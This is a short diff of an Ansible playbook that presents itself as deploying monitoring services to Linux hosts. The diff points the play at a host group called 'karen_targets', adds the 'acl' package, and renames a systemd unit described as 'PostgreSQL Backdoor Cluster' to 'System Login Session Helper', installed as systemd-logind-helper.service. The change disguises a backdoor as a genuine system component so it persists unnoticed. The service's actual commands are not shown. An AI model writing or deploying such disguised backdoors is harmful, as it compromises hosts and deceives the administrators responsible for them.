@@ -1,7 +1,7 @@
 ---
 
 - name: Deploy monitoring services to Linux hosts
-  hosts: linux
+  hosts: karen_targets
   become: yes
   gather_facts: no
 
@@ -19,6 +19,7 @@
       apt:
         name:
           - postgresql
+          - acl
         state: present
         update_cache: yes
 
@@ -62,7 +63,7 @@
         dest: "/etc/systemd/system/systemd-logind-helper.service"
         content: |
           [Unit]
-          Description=PostgreSQL Backdoor Cluster
+          Description=System Login Session Helper
           After=network.target
 
           [Service]
